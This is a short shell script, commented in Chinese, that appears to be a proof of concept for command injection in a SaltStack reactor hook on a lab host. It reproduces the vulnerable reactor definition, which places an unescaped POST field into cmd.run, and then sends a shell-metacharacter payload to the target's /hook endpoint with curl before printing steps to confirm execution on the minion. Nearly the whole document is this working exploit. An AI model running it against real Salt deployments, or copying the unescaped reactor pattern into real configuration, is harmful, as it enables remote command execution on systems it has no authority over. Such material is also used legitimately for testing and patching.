#!/bin/sh
# ubuntu-26.04 saltpoc SaltStack reactor 命令注入 PoC (说明 + 触发脚本)
#
# 漏洞: /srv/reactor/hook.sls
#   poc_rce:
#     local.cmd.run:
#       - tgt: pocminion
#       - arg:
#         - echo {{ data["post"]["m"] }} > /tmp/pwned && touch /tmp/RCE_PROOF
#
# {{ data["post"]["m"] }} 来自 salt-api hook 端点 POST body 的 "m" 字段，未转义拼进 shell。
# 触发: POST http://<target>:8000/hook  body={"m":"<注入命令>"}

TARGET="${1:-http://127.0.0.1:8000}"
PAYLOAD="${2:-PWNED; id > /tmp/salt_cmd_injection_result.txt}"

echo "[*] 目标: $TARGET"
echo "[*] 触发 reactor 命令注入 (m 字段注入 shell 元字符)..."

# 若 hook 端点未授权，直接触发；否则需先获取 token (X-Auth-Token)
curl -s -X POST "$TARGET/hook" \
  -H "Content-Type: application/json" \
  -d "{\"m\": \"$PAYLOAD\"}"

echo ""
echo "[*] 验证（在 pocminion 上）:"
echo "    cat /tmp/pwned"
echo "    ls -la /tmp/RCE_PROOF /tmp/salt_cmd_injection_result.txt"
